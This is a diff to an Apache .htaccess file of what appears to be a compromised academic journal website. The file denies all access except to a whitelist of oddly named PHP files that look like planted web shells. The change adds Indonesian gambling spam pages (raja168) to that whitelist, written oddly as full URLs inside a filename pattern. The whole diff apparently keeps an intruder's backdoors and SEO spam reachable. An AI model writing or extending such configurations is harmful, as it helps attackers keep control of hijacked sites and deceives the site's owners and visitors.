@@ -7,7 +7,7 @@ Deny from all
 Order Deny,Allow
 Deny from all
 </FilesMatch>
-<FilesMatch '^(google2ab2f7043824e50f.html|google731b0f32c8aa9f28.html|googlea4a36b252e50789a.html|googlee68d51658283c221.html|index.php|index-old.php|index.txt|auth.php|IssueData.inc.php|PKPDc11Function.inc.php|indexSite_journal_list_3.php|yop.php|dddd.php|simbio_tokenizecqls.php)$'>
+<FilesMatch '^(google2ab2f7043824e50f.html|google731b0f32c8aa9f28.html|googlea4a36b252e50789a.html|googlee68d51658283c221.html|index.php|index-old.php|index.txt|auth.php|IssueData.inc.php|PKPDc11Function.inc.php|indexSite_journal_list_3.php|yop.php|dddd.php|simbio_tokenizecqls.php|https://ojs.stikesnas.ac.id/files/journals/trik-sukses-main-wins-3-versi-raja168.html|https://ojs.stikesnas.ac.id/files/journals/mahasiswa-menang-rp86-juta-panduan-wins-3-raja168.html|https://ojs.stikesnas.ac.id/files/journals/inovasi-baru-raja168-untuk-menang-wins-3.html|https://ojs.stikesnas.ac.id/files/journals/raja168-selamatkan-pemain-dari-kekalahan-wins-3.html|https://ojs.stikesnas.ac.id/files/journals/raja168-ingatkan-pelajari-dasar-wins-3-dulu.html)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
